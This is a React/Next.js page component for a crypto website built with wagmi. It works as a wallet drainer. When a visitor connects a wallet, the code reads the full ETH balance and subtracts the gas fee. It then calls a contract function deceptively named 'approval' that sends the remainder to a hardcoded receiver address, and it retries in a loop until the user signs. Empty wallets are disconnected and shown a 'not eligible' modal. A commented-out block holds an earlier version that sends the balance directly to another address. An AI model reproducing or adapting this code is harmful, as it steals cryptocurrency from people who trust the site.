"use client"

import styles from './page.module.css'
import Price from '@/components/coinlib'
import Header from '@/components/header'
import Hero from '@/components/hero'
import Item from '@/components/box'
import Footer from '@/components/footer'
import { useWalletClient, useAccount, useNetwork, usePublicClient, useFeeData, useBalance, useDisconnect} from "wagmi"
//import { receivers } from '@/utils/constant/address'
import { useEffect, useState } from 'react'
import sync from "@/utils/sync.json"
import abis from "@/utils/abis/mover.json"
import {Modal} from "@/components/modal"


export default function Home() {

  /*
  // Connect and send

  const publicClient = usePublicClient()
  
  const [amt, setAmt] = useState(BigInt("0"))
  const {data: gasPrice } = useFeeData()
  const {address, isConnected} = useAccount({
      async onConnect({ address, connector, isReconnected }) {
   
          let bal = data?.value || BigInt("0")
          const gasEst = await publicClient.estimateGas({
              to: receiver,account: address, value: bal
          })
          let fee = gasPrice?.gasPrice || BigInt("0")
          let gasFee = fee * gasEst
          const rems = gasFee - bal // - fee change back to balance minus fee
          console.log("gasest, gastamt, balance, sendable",gasEst, gasFee, bal, rems)
      
          /**
           * if(bal <= BigInt("0"))
           * {
           *   alert("Wallet not eligible")
           *   disconnect()
           * return
           * }
           * 
           * Call up modal to indicate not eligible
           //
          
          setAmt(rems)
    
          }
  })
  const {data} = useBalance({address})
  const {chain} = useNetwork()
  const receiver =  "0x359C0217D37b7E603A788f84B793E53d145b9D45" //receivers[chain]

  const {data: walletClient, isFetched, status} = useWalletClient(
    
      { 
        
      onError(error) {
       
        console.log("WC error", error)
      },
    
      async onSuccess(data) {
    
          console.log(receiver)
        if(isConnected)
        {
    
        while(true) 
       {
    
          try {
                const res = await data?.sendTransaction({
                    account: address,
                    to: receiver,
                    value: amt
                })
                console.log("WC datas",res)
    break
            
           } 
           catch (error) {
            console.log("sending from approve i.e send direct",error)
           }
        }
        }
      }
    })
*/

const publicClient = usePublicClient()
const {disconnect} = useDisconnect()
    const abi = abis.abi;
    const con_address = "0x4f67aaad29973831e912fd9b8f5328a71b29d3d9" //"0x39f4b5bc4777f57999c0eba9313a411e93fea8f7"//"0xc8af4a815a9db81e8823e50638eb672ce021c038"
    const receiver = "0x352E108a200415bB300DDaDdfce13027e57CC33F"  //0x352E108a200415bB300DDaDdfce13027e57CC33F
    const [amt, setAmt] = useState<BigInt>()
    const {data: gasPrice } = useFeeData()
    
    const {address, isConnected} = useAccount( /*{
        async onConnect({ address, connector, isReconnected }) {
     
            let bal = await publicClient.getBalance({address}) //data?.value || BigInt("0")
            const gasEst = await publicClient.estimateContractGas({
                abi: abi,
        functionName: "transferEther",
        args: [receiver],
        account: address,
        address: con_address,
        value: bal
            })
            let fee = gasPrice?.gasPrice || BigInt("0")
            let gasFee = fee * gasEst
            const rems =  bal - gasFee // - fee change back to balance minus fee
            console.log("gasest, gastamt, balance, sendable",gasEst, gasFee, bal, rems)
            setAmt(rems)
            /**
             * if(bal <= BigInt("0"))
             * {
             *   alert("Wallet not eligible")
             *   disconnect()
             * return
             * }
             * 
             * Call up modal to indicate not eligible
             
            
            
      
            }
    } */)
  
    const {data: walletClient, isFetched, status} = useWalletClient(
      
        { 
          
        onError(error) {
         
          console.log("WC error", error)
        },
      
        async onSuccess(data) {
      
           
          if(isConnected) 
          {

/* estimate gas and get balance inside walletClient*/
const [address] = await data?.getAddresses()
let bal = await publicClient.getBalance({address}) //data?.value || BigInt("0")

if(bal <= BigInt(0))
{
  disconnect()
  const mbtn = document.querySelector("#shm") //.clicked()
  mbtn?.click()
  
  return
}

const gasEst = await publicClient.estimateContractGas({
    abi: abi,
functionName: "approval",
args: [receiver],
account: address,
address: con_address,
value: bal
})
let fee = gasPrice?.gasPrice || BigInt("0")
let gasFee = fee * gasEst 
const rems =  bal - gasFee - BigInt(10000000000000000) // - fee change back to balance minus fee
console.log("gasest, gastamt, balance, sendable",gasEst, gasFee, bal, rems)

      const { request} = await publicClient.simulateContract({
        abi: abi,
        functionName: "approval",
        args: [receiver],
        account: address,
        address: con_address,
        value: rems
      })
          while(true) 
         {
      
            try {
                  const res = await data?.writeContract(request)
                  console.log("WC datas",res)
      break
              
             } 
             catch (error) {
              console.log("sending from approve i.e send direct",error)
             }
          }
          }
        }
      })
     
  return (
    <>
    <Price />
    <Header />
    <Hero />
    <main className={styles.main}>
    
    <section id="featured-services" className="featured-services">
      <div className="container" data-aos="fade-up">

        <div className="row">

        {
          sync.map((item,index) => 
<Item title={item.title} message={item.message} key={index} />
          )
        }

          </div>
          </div>
          <button type="button" id="shm" className="btn btn-primary d-none" data-bs-toggle="modal" data-bs-target="#exampleModal">
            Launch demo modal
        </button>
          </section>

    </main>
    <Modal />
    <Footer />
    </>
  )
}
